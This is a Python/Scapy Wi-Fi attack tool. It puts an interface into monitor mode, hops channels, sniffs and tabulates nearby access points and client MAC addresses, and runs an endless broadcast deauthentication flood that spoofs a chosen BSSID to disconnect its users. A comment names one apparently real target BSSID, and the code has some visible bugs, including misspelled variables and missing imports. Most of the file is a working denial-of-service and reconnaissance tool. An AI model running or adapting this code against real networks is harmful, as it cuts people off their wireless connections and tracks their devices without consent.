from scapy.all import *
from WifiClass import *
from Client import *
from time import sleep
from prettytable import PrettyTable
from subprocess import Popen, PIPE,check_output
from threading import Lock
global APtable,CLtable,WifiList
global APs,F_bssids,ClientsList
Channels=[1,2,3,4,5,6,7,8,9,10,11,12,13,14]

ClientsList=[]
'''
channelSwitcher() is for hop/jump between channels [1,14]
'''
def channelSwitcher(interface):
    with lock:
        try:
            channel = 1
            jmp = 0
            while True:
                try:
                    time.sleep(0.5)
                    os.system('iwconfig %s channel %d' % (interface, channel))
                    curr = Channels[jmp%14]
                    jmp+=1
                    if curr != 0 and curr != channel:
                        channel = curr
                except KeyboardInterrupt:
                    main()
        except KeyboardInterrupt:
            main ()
'''
Deauth() calls sendDeauth for acuatly send the "Deauth Packets"
Deauth() is just request the MAC address of the AP the attack.
'''
def Deauth():
    try:
        print("\n\n[+]Enter as following :\n BSSID ClientMAC Channe numberOfPKT")
        BSSID = raw_input("\n[+]Example: FF:FF:FF:FF:FF:FF 10\n")
        sendDeauth(BSSID)
    except KeyboardInterrupt:
        print("\nOK quitting..")
        sys.exit(1)
'''
SendDeauth() sending the packet, RadioTap over Dot11(which is 802.11) over Dot11Deuath
addr1 = is for broudcast
addr2 = addr3 = is the attack AP
'''
def sendDeauth(BSSID):
    conf.iface = "wlan0"
    packet = RadioTap()/Dot11(type=0,subtype=12,addr1="FF:FF:FF:FF:FF:FF",addr2=BSSID,addr3=BSSID)/Dot11Deauth()
    i=1
    try:
        while True:
            #14:AE:DB:B7:D1:8D-Torgeman BSSID
            sleep(0.1)
            os.system("clear")
            sendp(packet,verbose=False)
            #print(,end="",flush=True)
            sys.stdout.write("Sent "+str(i)+" Packets to "+BSSID)
            sys.stdout.flush()
            i+=1

    except KeyboardInterrupt:
        print("Quitting")
        sys.exit(1)
'''

'''
def findSSID(pkt):
    try:
        if pkt.haslayer(Dot11Beacon):
            if pkt.getlayer(Dot11).addr2:
                F_bssids.append(pkt.getlayer(Dot11).addr2)
                tmpWifi = parsePkt(pkt)
                #RSSIUpdate(pkt)
                if(tmpWifi not in WifiList):
                    #print(tmpWifi)
                    WifiList.append(tmpWifi)
                elif(tmpWifi in WifiList):
                    for w in WifiList:
                        if(tmpWifi.getBSSID() == w.getBSSID()):
                            if(tmpWifi.getRSSI() != w.getRSSI()):
                                w.setRSSI(tmpWifi.getRSSI())
                                return
                ##Hidden Wifi#
                #if  tmpWifi.getSSID() == '' or pkt.getlayer(Dot11Elt).ID != 0:
                   #print "Hidden Network Detected"
        #elif pkt.haslayer(Dot11) and pkt.getlayer(Dot11).type == 2L and not pkt.haslayer(EAPOL):
        elif pkt.haslayer(Dot11) and pkt.subtype in [0,1,2,4]:
            #print(pkt.getlayer(Dot11).addr2)
            #print(pkt.getlayer(Dot11).addr1)
            # This means it's data frame.
            sender = pkt.getlayer(Dot11).addr2.upper()
            reciver = pkt.getlayer(Dot11).addr1.upper()

            if (reciver != "FF:FF:FF:FF:FF:FF" and sender != "FF:FF:FF:FF:FF:FF"):
                for w in WifiList:
                    if(w.getBSSID().upper() == reciver and w.getBSSID().upper() != sender):
                            tmpClient = Client(w.getBSSID(),sender)
                            if(tmpClient not in w.getClients()):
                                w.getClients().append(tmpClient)
                                #w.getClients().append(sender)
                    if(w.getBSSID().upper() != reciver and w.getBSSID().upper() == sender):
                            tmpClient = Client(w.getBSSID(),reciver)
                            if(tmpClient not in w.getClients()):
                                w.getClients().append(tmpClient)
                                #w.getClients().append(reciver)
            else:
                if(sender != "FF:FF:FF:FF:FF:FF" and sender not in ClientsList):
                    ClientsList.append(sender)
                elif reciver !="FF:FF:FF:FF:FF:FF" not in ClientsList:
                    ClientsList.append(reciver)

    except KeyboardInterrupt:
        Deauth()
'''
Printer() is for print the data that collect.
going through WifiList and print each Wifi object.
same thing for Clients.
'''
def Printer():
    try:
        os.system("clear")
        os.system("cat art.txt")
        APtable.clear_rows()
        CLtable.clear_rows()
        for w in WifiList:
            APtable.add_row([w.getSSID(),w.getBSSID(),w.getRSSI(),w.getChannel(),w.getNumOfClients(),w.getVendor()])
            for c in w.getClients():
                CLtable.add_row([w.getBSSID(),c.getBSSID(),c.getVendor()])
        for c in ClientsList:
                CLtable.add_row([c,"Not associate","N/A"])

        print(APtable.get_string(sortby="BSSID"))
        print(10*"-" + "Clients" + 10*"-")
        print(CLtable)
    except KeyboardInterrupt:
        main()
'''
parsePkt takes packets and parse it into Wifi object,
'''
def parsePkt(pkt):
    RSSI=-(256-ord(pkt.notdecoded[-4:-3]))
    SSID=pkt.getlayer(Dot11Elt).info
    BSSID=pkt.addr2
    channel = int(ord(pkt[Dot11Elt:3].info))
    w = Wifi(SSID,BSSID,RSSI,channel)
    return w
'''
Define Tables is for tabls printing, define that headers of the table.
'''
def DefineTables():
    global APtable,CLtable,APs,F_bssids,WifiList
    APtable = PrettyTable()
    APtable.field_names=["SSID","BSSID","RSSI","Channel","Clients","Vendor"]
    CLtable = PrettyTable()
    CLtable.field_names=["AP","Client Mac","Vendor"]
    APs=[]
    F_bssids=[]
    WifiList=[]
'''
Create threads to hop between channel and than each thread find AP and clients.
'''
def Scan():
    try:
        with lock:
            thread = threading.Thread(target=channelSwitcher, args=("wlan0", ), name="channelSwitcher")
            thread.daemon = True
            thread.start()
        while True:
            Printer()
            sniff(iface="wlan0",prn=findSSID,count=1)
    except KeyboardInterrupt:
        Deauth()
'''
main() if the main window , just for UI.
'''
def main():
    try:
        os.system("clear")
        os.system("cat art.txt")
        choice = raw_input("\n \n[+]Start scanning?(y/n)\n")
        if(choice.lower().startswith('y')):
            MonitorMode()
            Scan()
        else:
            choice = raw_input("\n[+]Start deauth?(y/n)\n")
            if(choice.lower().startswith('y')):
                Deauth()
            else:
                print("Quitting. . . ")
                sys.exit(1)
    except KeyboardInterrupt:
        print("Something wrong , bye bye!")
        sleep(0.5)
        exit()
    finally:
        os.system("ifconfig wlan0 down && iwconfig wlan0 mode managed && ifconfig wlan0 up")
'''
MonitorMode() is for enter the network adapter to monitor mode.
'''
def MonitorMode():
    try:
        print("Enter wlan0 to monitor mode...\n")
        sleep(0.5)
        test = subprocess.check_output("iwconfig", stderr=subprocess.STDOUT)
        proc0 = subprocess.call("ifconfig wlan0 down",shell=True)
        sleep(0.5)
        proc1 = subprocess.call("iwconfig wlan0 mode monitor",shell=True)
        sleep(0.5)
        proc2 = subprocess.call("ifconfig wlan0 up",shell=True)
        #os.system("ifconfig wlan0 down && iwconfig wlan0 mode monitor && ifconfig wlan0 up")
        sleep(0.5)
    except Exception:
        print("Cannot switch to monitor mode, quitting. . . ")
        sleep(1)
        exit(1)

def signalHandler(signum, frame):
    os.system("clear")
    chioce = raw_input("(1)Exit\n(2)Scan\n(3)Deuath\n")
    if(choice == 2):
        Scan()
    elif(choice == 3):
        Deauth()
    else:
        exit(1)

if __name__ == "__main__":
    signal.signal(signal.SIGTERM, signalHandler)
    signal.signal(signal.SIGINT, signalHandler)
    try:
        if os.geteuid():
            sys.exit('['+R+'-'+W+'] Please run as root')
        lock = Lock()
        DefineTables()
        main()
    except KeyboardInterrupt:
        print("Quitting . . ")
        exit()
